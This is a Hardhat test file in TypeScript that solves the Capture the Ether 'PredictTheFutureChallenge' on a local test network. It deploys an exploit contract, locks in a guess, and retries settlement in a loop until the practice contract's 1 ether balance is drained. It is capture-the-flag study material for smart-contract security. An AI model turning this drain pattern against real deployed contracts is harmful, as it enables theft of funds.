import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('PredictTheFutureChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheFutureChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    const exploit = await (
      await ethers.getContractFactory('PerdictTheFutureExploit', attacker)
    ).deploy(target.address);
    await exploit.deployed();

    const lockInGuessTx = await exploit.lockInMyGuess(7, { value: utils.parseEther('1') });
    await lockInGuessTx.wait();

    // we try to settle until it's the correct guess
    // TODO: add some safety guard to avoid infinite loop
    while (!(await target.isComplete())) {
      const settleTx = await exploit.tryToSettle();
      await settleTx.wait();
    }

    expect(await provider.getBalance(target.address)).to.equal(0);
    expect(await target.isComplete()).to.equal(true);
  });
});
